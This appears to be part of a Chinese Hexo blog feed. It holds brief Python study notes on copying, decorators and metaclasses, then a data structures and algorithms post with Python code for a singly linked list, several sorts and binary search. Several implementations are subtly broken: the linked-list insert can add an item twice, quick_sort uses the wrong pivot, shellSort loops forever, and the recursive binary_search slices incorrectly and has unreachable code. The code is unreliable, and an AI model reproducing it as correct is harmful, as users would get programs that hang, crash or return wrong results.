<p>多线程比单线程要快，但不能完全发挥多线程的能力，适合IO密集型程序，不适合计算密集型程序</p>
<p>计算密集型：进程<br>IO密集型：线程，协程</p>
<p>换解释器，或用其他语言执行</p>
<h2 id="深拷贝和浅拷贝"><a href="#深拷贝和浅拷贝" class="headerlink" title="深拷贝和浅拷贝"></a>深拷贝和浅拷贝</h2><p>=：引用，指向<br>浅拷贝：拷贝指针时不拷贝数据<br>深拷贝：拷贝指针时同时将数据也拷贝一份<br>import copy<br>copy.copy   拷贝元组时不会拷贝<br>copy.deepcopy   拷贝元组时不会拷贝，但如果元组内是可变数据除外<br>id()</p>
<p>其他：<br>浅拷贝：列表切片</p>
<h2 id="私有化"><a href="#私有化" class="headerlink" title="私有化"></a>私有化</h2><p><code>_x  __x __x__ x_</code><br>名字重整</p>
<h2 id="import"><a href="#import" class="headerlink" title="import"></a>import</h2><p>from xxx import yyy<br>import xxx<br>from xxx import *<br>import xxx as yyy</p>
<p>reload</p>
<h2 id="封装，继承，多态"><a href="#封装，继承，多态" class="headerlink" title="封装，继承，多态"></a>封装，继承，多态</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">__dict__</span><br><span class="line">__class__</span><br></pre></td></tr></table></figure>

<h2 id="方法解析顺序MRO"><a href="#方法解析顺序MRO" class="headerlink" title="方法解析顺序MRO"></a>方法解析顺序MRO</h2><p>重写，重载<br>super() <code>__mro__</code><br>super().<strong>init</strong>()<br>super(xxx, self).<strong>init</strong>()</p>
<h2 id="args-kwargs"><a href="#args-kwargs" class="headerlink" title="*args,**kwargs"></a><code>*args,**kwargs</code></h2><p>加*拆包</p>
<h2 id="面向对象探讨"><a href="#面向对象探讨" class="headerlink" title="面向对象探讨"></a>面向对象探讨</h2><p>类对象，实力对象，类属性，实例属性，类方法，实例方法，静态方法</p>
<p><code>__new__</code>:创建对象，生成一个内存空间<br><code>__init__</code>:初始化对象<br><code>__class__</code>:代表类<br>@classmethod    类方法<br>@staticmethod   </p>
<h2 id="property属性"><a href="#property属性" class="headerlink" title="property属性"></a>property属性</h2><p>@property   将方法当作属性，返回值为值，调用时无需括号，参数只有self</p>
<p>设置和删除property属性<br>@xxx.setter<br>@xxx.deleter</p>
<p>xxx = property(getyyy，setyyy, delyyy，”description…”) 类属性property属性</p>
<h2 id="魔法属性，方法"><a href="#魔法属性，方法" class="headerlink" title="魔法属性，方法"></a>魔法属性，方法</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">__doc__</span><br><span class="line">__class__</span><br><span class="line">__module__</span><br><span class="line">__init__</span><br><span class="line">__del__</span><br><span class="line">__call__</span><br><span class="line">__dict__</span><br><span class="line">__str__</span><br><span class="line">__getitem__ __setitem__ __delitem__</span><br><span class="line">__getslice__    set del</span><br></pre></td></tr></table></figure>

<h2 id="with与上下文管理器"><a href="#with与上下文管理器" class="headerlink" title="with与上下文管理器"></a>with与上下文管理器</h2><p>任何实现了<code>__enter__()  __exit__()</code>方法的对象都可称之为上下文管理器，即可使用with</p>
<p>from contextlib import contextmanager<br>@contextmanager</p>
<h2 id="装饰器"><a href="#装饰器" class="headerlink" title="装饰器"></a>装饰器</h2><p>通用装饰器</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">set_func</span><span class="params">(func)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">call_func</span><span class="params">(*args, **kwargs)</span>:</span></span><br><span class="line">        <span class="string">""" xxxxx """</span></span><br><span class="line">        <span class="keyword">return</span> func(*args, **kwargs)</span><br><span class="line">    <span class="keyword">return</span> call_func</span><br></pre></td></tr></table></figure>

<p>多个装饰器装饰同一个函数<br>先装下面的，再装上面的<br>带参数装饰器</p>
<h2 id="闭包"><a href="#闭包" class="headerlink" title="闭包"></a>闭包</h2><p>函数套函数，内函数返回函数</p>
<h2 id="元类"><a href="#元类" class="headerlink" title="元类"></a>元类</h2><p>类也是对象</p>
<p>元类是一种特殊的类，用来创建类</p>
<p>globles()   查看全局对象引用</p>
<p>type创建类</p>
<h3 id="ORM"><a href="#ORM" class="headerlink" title="ORM"></a>ORM</h3><p>ORM 对象-关系映射</p>
<p>setattr()</p>
]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>数据结构与算法</title>
    <url>/2020/04/19/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/</url>
    <content><![CDATA[<h2 id="引入"><a href="#引入" class="headerlink" title="引入"></a>引入</h2><h3 id="算法的概念"><a href="#算法的概念" class="headerlink" title="算法的概念"></a>算法的概念</h3><p>算法的五大特性：输入，输出，有穷性，确定性，可行性</p>
<h4 id="时间复杂度"><a href="#时间复杂度" class="headerlink" title="时间复杂度"></a>时间复杂度</h4><h5 id="大O表示法"><a href="#大O表示法" class="headerlink" title="大O表示法"></a>大O表示法</h5><p><img src="/2020/04/19/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/1587259066757.png" alt="1587259066757"></p>
<p><img src="/2020/04/19/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/1587259082776.png" alt="1587259082776"></p>
<h5 id="最坏时间复杂的"><a href="#最坏时间复杂的" class="headerlink" title="最坏时间复杂的"></a>最坏时间复杂的</h5><p><img src="/2020/04/19/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/1587259144236.png" alt="1587259144236"></p>
<h5 id="计算时间复杂度"><a href="#计算时间复杂度" class="headerlink" title="计算时间复杂度"></a>计算时间复杂度</h5><p><img src="/2020/04/19/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/1587259170619.png" alt="1587259170619"></p>
<h3 id="数据结构"><a href="#数据结构" class="headerlink" title="数据结构"></a>数据结构</h3><h4 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h4><p><img src="/2020/04/19/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/1587259255225.png" alt="1587259255225"></p>
<h4 id="算法与数据结构"><a href="#算法与数据结构" class="headerlink" title="算法与数据结构"></a>算法与数据结构</h4><p>算法是为了解决实际问题而设计的，数据结构是算法需要处理的问题载体</p>
<p>数据结构只是静态的描述了数据元素之间的关系，高效的程序需要在数据结构的基础上设计和选择算法。</p>
<p>程序 = 数据结构 + 算法</p>
<h4 id="抽象数据类型"><a href="#抽象数据类型" class="headerlink" title="抽象数据类型"></a>抽象数据类型</h4><p>抽象数据类型是指一个数学模型以及在此数学模型上的一组操作。引入数据模型的目的是把数据类型的表示和数据类型上的运算的实现与这些数据类型和运算在程序中的引用隔开，使他们相互独立。</p>
<p>最常用的数据运算：插入，删除，修改，查找，排序</p>
<h2 id="顺序表"><a href="#顺序表" class="headerlink" title="顺序表"></a>顺序表</h2><h3 id="顺序表的基本形式"><a href="#顺序表的基本形式" class="headerlink" title="顺序表的基本形式"></a>顺序表的基本形式</h3><p><img src="/2020/04/19/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/1587259651861.png" alt="1587259651861"></p>
<p><img src="/2020/04/19/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/1587259689182.png" alt="1587259689182"></p>
<h3 id="顺序表的结构与实现"><a href="#顺序表的结构与实现" class="headerlink" title="顺序表的结构与实现"></a>顺序表的结构与实现</h3><h4 id="顺序表的结构"><a href="#顺序表的结构" class="headerlink" title="顺序表的结构"></a>顺序表的结构</h4><p><img src="/2020/04/19/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/1587259710869.png" alt="1587259710869"></p>
<h4 id="顺序表的实现"><a href="#顺序表的实现" class="headerlink" title="顺序表的实现"></a>顺序表的实现</h4><p><img src="/2020/04/19/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/1587259723570.png" alt="1587259723570"></p>
<h4 id="元素存储区"><a href="#元素存储区" class="headerlink" title="元素存储区"></a>元素存储区</h4><p>替换，扩充</p>
<p>扩充的两种策略：</p>
<ul>
<li>每次增加固定数量的存储位置（节省空间，但操作频繁）</li>
<li>每次扩容加倍（减少操作次数，但存在空间浪费）</li>
</ul>
<h3 id="顺序表的操作"><a href="#顺序表的操作" class="headerlink" title="顺序表的操作"></a>顺序表的操作</h3><h4 id="增加"><a href="#增加" class="headerlink" title="增加"></a>增加</h4><p><img src="/2020/04/19/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/1587259876525.png" alt="1587259876525"></p>
<h4 id="删除"><a href="#删除" class="headerlink" title="删除"></a>删除</h4><p><img src="/2020/04/19/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/1587259893954.png" alt="1587259893954"></p>
<h3 id="python中的顺序表"><a href="#python中的顺序表" class="headerlink" title="python中的顺序表"></a>python中的顺序表</h3><p>python中list和tuple两种数据类型采用了顺序表结构。tuple是不可变类型，不支持改变状态，其它与list性质类似，这里只说list。</p>
<p><img src="/2020/04/19/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/1587260069197.png" alt="1587260069197"></p>
<h2 id="链表"><a href="#链表" class="headerlink" title="链表"></a>链表</h2><p><img src="/2020/04/19/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/1587260133720.png" alt="1587260133720"></p>
<p>顺序表的构建需要预先知道数据大小来申请连续的存储空间，扩充时也很繁琐，所以使用起来不灵活，而链表可以充分利用内存空间，实现灵活的内存动态管理</p>
<h3 id="单向链表"><a href="#单向链表" class="headerlink" title="单向链表"></a>单向链表</h3><p>单向链表是链表中最简单的一种形式，它的每个节点包含两个域，信息域和链接域。这个链接域指向下一个节点，最后一个节点为空。</p>
<p><img src="/2020/04/19/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/1587260299835.png" alt="1587260299835"></p>
<p><strong>单链表的实现</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 实现单链表</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Node</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="string">"""节点"""</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, elem)</span>:</span></span><br><span class="line">        self.elem = elem</span><br><span class="line">        self.next = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SingleLinkList</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="string">""" 单链表"""</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, node=None)</span>:</span></span><br><span class="line">        self._head = node</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">is_empty</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="string">""" 判断链表是否为空"""</span></span><br><span class="line">        <span class="keyword">return</span> self._head == <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">length</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="string">""" 链表长度"""</span></span><br><span class="line">        <span class="comment"># cur游标</span></span><br><span class="line">        cur = self._head</span><br><span class="line">        <span class="comment"># 计数</span></span><br><span class="line">        count = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> cur != <span class="literal">None</span>:</span><br><span class="line">            count += <span class="number">1</span></span><br><span class="line">            cur = cur.next</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> count</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">travel</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="string">""" 遍历整个链表"""</span></span><br><span class="line">        cur = self._head</span><br><span class="line">        <span class="keyword">while</span> cur != <span class="literal">None</span>:</span><br><span class="line">            print(cur.elem)</span><br><span class="line">            cur = cur.next</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(self, item)</span>:</span></span><br><span class="line">        <span class="string">""" 链表头部添加元素"""</span></span><br><span class="line">        node = Node(item) </span><br><span class="line">        node.next = self._head</span><br><span class="line">        self._head = node</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">append</span><span class="params">(self, item)</span>:</span></span><br><span class="line">        <span class="string">""" 链表尾部添加元素"""</span></span><br><span class="line">        node = Node(item)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> self.is_empty():</span><br><span class="line">            self._head = node</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">        cur = self._head</span><br><span class="line">        <span class="keyword">while</span> cur.next != <span class="literal">None</span>:</span><br><span class="line">            cur = cur.next</span><br><span class="line">        cur.next = node</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">insert</span><span class="params">(self, pos, item)</span>:</span></span><br><span class="line">        <span class="string">""" 在指定位置添加元素"""</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> pos &lt;= <span class="number">0</span>:</span><br><span class="line">            self.add(item)</span><br><span class="line">        <span class="keyword">if</span> pos &gt; self.length()<span class="number">-1</span>:</span><br><span class="line">            self.append(item)</span><br><span class="line"></span><br><span class="line">        node = Node(item)</span><br><span class="line"></span><br><span class="line">        pre = self._head</span><br><span class="line">        count = <span class="number">0</span></span><br><span class="line">        <span class="keyword">while</span> count &lt; (pos<span class="number">-1</span>):</span><br><span class="line">            count += <span class="number">1</span></span><br><span class="line">            pre = pre.next</span><br><span class="line">        node.next = pre.next    </span><br><span class="line">        pre.next = node</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">remove</span><span class="params">(self, item)</span>:</span></span><br><span class="line">        <span class="string">""" 删除节点"""</span></span><br><span class="line">        cur = self._head</span><br><span class="line">        pre = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> cur != <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">if</span> cur.elem == item:</span><br><span class="line">                <span class="keyword">if</span> cur == self._head:</span><br><span class="line">                    self._head = cur.next</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    pre.next = cur.next</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                pre = cur</span><br><span class="line">                cur = cur.next</span><br><span class="line">        </span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">search</span><span class="params">(self, item)</span>:</span></span><br><span class="line">        <span class="string">""" 查找节点是否存在"""</span></span><br><span class="line"></span><br><span class="line">        cur = self._head</span><br><span class="line">        <span class="keyword">while</span> cur != <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">if</span> cur.elem == item:</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                cur = cur.next</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br></pre></td></tr></table></figure>

<p><strong>单链表与顺序表对比</strong></p>
<p><img src="/2020/04/19/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/1587260535268.png" alt="1587260535268"></p>
<h3 id="单向循环链表"><a href="#单向循环链表" class="headerlink" title="单向循环链表"></a>单向循环链表</h3><p><img src="/2020/04/19/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/1587260560172.png" alt="1587260560172"></p>
<p>实现原理同单链表，但需要注意尾节点与头节点之间的一些细节。</p>
<h3 id="双向链表"><a href="#双向链表" class="headerlink" title="双向链表"></a>双向链表</h3><p><img src="/2020/04/19/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/1587260679692.png" alt="1587260679692"></p>
<h2 id="栈"><a href="#栈" class="headerlink" title="栈"></a>栈</h2><p><img src="/2020/04/19/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/1587260748483.png" alt="1587260748483"></p>
<h3 id="栈结构的实现"><a href="#栈结构的实现" class="headerlink" title="栈结构的实现"></a>栈结构的实现</h3><p><img src="/2020/04/19/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/1587260796780.png" alt="1587260796780"></p>
<h2 id="队列"><a href="#队列" class="headerlink" title="队列"></a>队列</h2><p><img src="/2020/04/19/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/1587260809342.png" alt="1587260809342"></p>
<h3 id="双端队列"><a href="#双端队列" class="headerlink" title="双端队列"></a>双端队列</h3><p><img src="/2020/04/19/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/1587260830133.png" alt="1587260830133"></p>
<h2 id="排序与搜索"><a href="#排序与搜索" class="headerlink" title="排序与搜索"></a>排序与搜索</h2><p>稳定性：不稳定排序算法可能会在相等的键值中改变纪录的相对次序，但稳定排序算法不会</p>
<h3 id="冒泡排序"><a href="#冒泡排序" class="headerlink" title="冒泡排序"></a>冒泡排序</h3><p><img src="/2020/04/19/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/1587260866507.png" alt="1587260866507"></p>
<h4 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bubbleSort</span><span class="params">(alist)</span>:</span></span><br><span class="line">    <span class="string">"""冒泡排序"""</span></span><br><span class="line">    n = len(alist)</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(n<span class="number">-1</span>):</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(n-j<span class="number">-1</span>):</span><br><span class="line">            <span class="keyword">if</span> alist[i] &gt; alist[i+<span class="number">1</span>]:</span><br><span class="line">                alist[i],alist[i+<span class="number">1</span>] = alist[i+<span class="number">1</span>],alist[i]</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    li = [<span class="number">54</span>, <span class="number">26</span>, <span class="number">77</span>, <span class="number">31</span>, <span class="number">44</span>, <span class="number">55</span>, <span class="number">20</span>]</span><br><span class="line">    bubbleSort(li)</span><br><span class="line">    print(li)</span><br></pre></td></tr></table></figure>

<h3 id="选择排序"><a href="#选择排序" class="headerlink" title="选择排序"></a>选择排序</h3><h4 id="实现-1"><a href="#实现-1" class="headerlink" title="实现"></a>实现</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">selectSort</span><span class="params">(alist)</span>:</span></span><br><span class="line">    <span class="string">""" 选择排序"""</span></span><br><span class="line">    n = len(alist)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(n):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(i, n):</span><br><span class="line">            <span class="keyword">if</span> alist[j] &lt; alist[i]:</span><br><span class="line">                alist[i], alist[j] = alist[j], alist[i]</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    li = [<span class="number">54</span>, <span class="number">26</span>, <span class="number">93</span>, <span class="number">17</span>, <span class="number">77</span>, <span class="number">31</span>, <span class="number">44</span>, <span class="number">55</span>, <span class="number">20</span>]</span><br><span class="line">    selectSort(li)</span><br><span class="line">    print(li)</span><br></pre></td></tr></table></figure>

<h3 id="插入排序"><a href="#插入排序" class="headerlink" title="插入排序"></a>插入排序</h3><p><img src="/2020/04/19/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/1587260970197.png" alt="1587260970197"></p>
<h4 id="实现-2"><a href="#实现-2" class="headerlink" title="实现"></a>实现</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">insertSort</span><span class="params">(alist)</span>:</span></span><br><span class="line">    <span class="string">""" 插入排序"""</span></span><br><span class="line">    n = len(alist)</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">1</span>, n):</span><br><span class="line">        i = j</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">while</span> i &gt; <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">if</span> alist[i] &lt; alist[i<span class="number">-1</span>]:</span><br><span class="line">                alist[i], alist[i<span class="number">-1</span>] = alist[i<span class="number">-1</span>], alist[i]</span><br><span class="line">                i -= <span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<h3 id="快速排序"><a href="#快速排序" class="headerlink" title="快速排序"></a>快速排序</h3><h4 id="实现-3"><a href="#实现-3" class="headerlink" title="实现"></a>实现</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">quick_sort</span><span class="params">(alist, first, last)</span>:</span></span><br><span class="line">    <span class="string">""" 快速排序"""</span></span><br><span class="line">    <span class="keyword">if</span> first &gt;= last:</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># n = len(alist)</span></span><br><span class="line">    mid_value = alist[<span class="number">0</span>]</span><br><span class="line">    low = first</span><br><span class="line">    high = last</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> low &lt; high:</span><br><span class="line">    </span><br><span class="line">        <span class="keyword">while</span> low &lt; high <span class="keyword">and</span> alist[high] &gt; mid_value:</span><br><span class="line">            high -= <span class="number">1</span></span><br><span class="line">        alist[low] = alist[high]</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> low &lt; high <span class="keyword">and</span> alist[low] &lt; mid_value:</span><br><span class="line">            low += <span class="number">1</span></span><br><span class="line">        alist[high] = alist[low]</span><br><span class="line">    alist[low] = mid_value</span><br><span class="line">    </span><br><span class="line">    quick_sort(alist, first, low<span class="number">-1</span>)</span><br><span class="line">    quick_sort(alist, low+<span class="number">1</span>, last)</span><br></pre></td></tr></table></figure>



<h3 id="希尔排序"><a href="#希尔排序" class="headerlink" title="希尔排序"></a>希尔排序</h3><p><img src="/2020/04/19/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/1587261017517.png" alt="1587261017517"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">shellSort</span><span class="params">(alist)</span>:</span></span><br><span class="line">    <span class="string">""" 希尔排序"""</span></span><br><span class="line">    n = len(alist)</span><br><span class="line">    gap = n//<span class="number">2</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> gap &gt; <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(gap, n):</span><br><span class="line">            i = j</span><br><span class="line">            <span class="keyword">while</span> i &gt; <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">if</span> alist[i] &lt; alist[i-gap]:</span><br><span class="line">                    alist[i], alist[i-gap] = alist[i-gap], alist[i]</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">        gap //= <span class="number">2</span></span><br></pre></td></tr></table></figure>

<h3 id="归并排序"><a href="#归并排序" class="headerlink" title="归并排序"></a>归并排序</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">mergeSort</span><span class="params">(alist)</span>:</span></span><br><span class="line">    <span class="string">""" 归并排序"""</span></span><br><span class="line">    n = len(alist)</span><br><span class="line">    <span class="keyword">if</span> n &lt;= <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> alist</span><br><span class="line">    mid = n // <span class="number">2</span></span><br><span class="line"></span><br><span class="line">    left_li = mergeSort(alist[:mid])</span><br><span class="line">    right_li = mergeSort(alist[mid:])</span><br><span class="line"></span><br><span class="line">    left_pointer, right_pointer = <span class="number">0</span>, <span class="number">0</span></span><br><span class="line">    result = []</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> left_pointer &lt; len(left_li) <span class="keyword">and</span> right_pointer &lt; len(right_li):</span><br><span class="line">        <span class="keyword">if</span> left_li[left_pointer] &lt; right_li[right_pointer]:</span><br><span class="line">            result.append(left_li[left_pointer])</span><br><span class="line">            left_pointer += <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            result.append(right_li[right_pointer])</span><br><span class="line">            right_pointer += <span class="number">1</span></span><br><span class="line">    </span><br><span class="line">    result += left_li[left_pointer:]</span><br><span class="line">    result += right_li[right_pointer:]</span><br><span class="line">    <span class="keyword">return</span> result</span><br></pre></td></tr></table></figure>

<h3 id="常见排序算法比较"><a href="#常见排序算法比较" class="headerlink" title="常见排序算法比较"></a>常见排序算法比较</h3><p><img src="/2020/04/19/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/1587261041798.png" alt="1587261041798"></p>
<h3 id="搜索"><a href="#搜索" class="headerlink" title="搜索"></a>搜索</h3><h4 id="二分法查找"><a href="#二分法查找" class="headerlink" title="二分法查找"></a>二分法查找</h4><p><img src="/2020/04/19/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/1587261059671.png" alt="1587261059671"></p>
<h4 id="实现-4"><a href="#实现-4" class="headerlink" title="实现"></a>实现</h4><ul>
<li>递归版本</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">binary_search</span><span class="params">(alist, item)</span>:</span></span><br><span class="line">    <span class="string">""" 二分查找"""</span></span><br><span class="line">    n = len(alist)</span><br><span class="line">    <span class="keyword">if</span> n &gt; <span class="number">0</span>:</span><br><span class="line">        mid = n//<span class="number">2</span></span><br><span class="line">        <span class="keyword">if</span> alist[mid] == item:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">elif</span> item &lt; alist[mid]:</span><br><span class="line">            <span class="keyword">return</span> binary_search(alist[:mid], item)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> binary_search(alist[mid+<span class="number">1</span>], item)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br></pre></td></tr></table></figure>

<ul>
<li>非递归版本</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">binary_search</span><span class="params">(alist, item)</span>:</span></span><br><span class="line">    <span class="string">""" 二分查找"""</span></span><br><span class="line">    n = len(alist)</span><br><span class="line">    first = <span class="number">0</span></span><br><span class="line">    last = n<span class="number">-1</span></span><br><span class="line">    <span class="keyword">while</span> first &lt;= last:</span><br><span class="line">        mid = (first + last)//<span class="number">2</span></span><br><span class="line">        <span class="keyword">if</span> alist[mid] == item:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">elif</span> item &lt; alist[mid]:</span><br><span class="line">            last = mid <span class="number">-1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            first = mid + <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br></pre></td></tr></table></figure>

<p><strong>时间复杂度</strong></p>
<p>最优时间复杂度：O(1)</p>
<p>最坏时间复杂度：O(logn)</p>
<h2 id="树"><a href="#树" class="headerlink" title="树"></a>树</h2><p><img src="/2020/04/19/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/1587261655184.png" alt="1587261655184"></p>
<h3 id="树的存储与表示"><a href="#树的存储与表示" class="headerlink" title="树的存储与表示"></a>树的存储与表示</h3><p><img src="/2020/04/19/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/1587261671447.png" alt="1587261671447"></p>
<p><img src="/2020/04/19/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/1587261685677.png" alt="1587261685677"></p>
